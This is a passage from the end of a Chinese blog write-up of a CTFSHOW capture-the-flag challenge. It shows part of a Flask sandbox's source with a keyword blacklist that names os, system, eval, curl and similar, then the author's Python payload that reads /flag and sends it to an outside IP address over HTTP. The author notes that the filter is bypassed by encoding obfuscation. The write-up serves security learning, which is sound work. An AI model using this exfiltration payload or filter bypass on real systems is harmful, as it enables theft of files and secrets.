class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">            reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]|request|len&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    s=run(code)</span><br><span class="line">                    <span class="keyword">return</span> s</span><br><span class="line">                <span class="keyword">except</span> func_timeout.exceptions.FunctionTimedOut:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">exec</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=open(&#x27;/flag&#x27;).read();import urllib;urllib.request.urlopen(f&#x27;http://43.140.198.45:5000/?flag=&#123;flag&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>和之前的题一样，编码混淆绕过</p>
</li>
</ol>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113778651">https://blog.csdn.net/solitudi/article/details/113778651</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/112692697">https://blog.csdn.net/miuzzx/article/details/112692697</a></p>
<p><a target="_blank" rel="noopener" href="https://sirbei.com/index.php/archives/597/">https://sirbei.com/index.php/archives/597/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&text=CTFSHOW-其他"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&is_video=false&description=CTFSHOW-其他"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTFSHOW-其他&body=Check out this article: https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&name=CTFSHOW-其他&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&t=CTFSHOW-其他"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    RacerZ
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
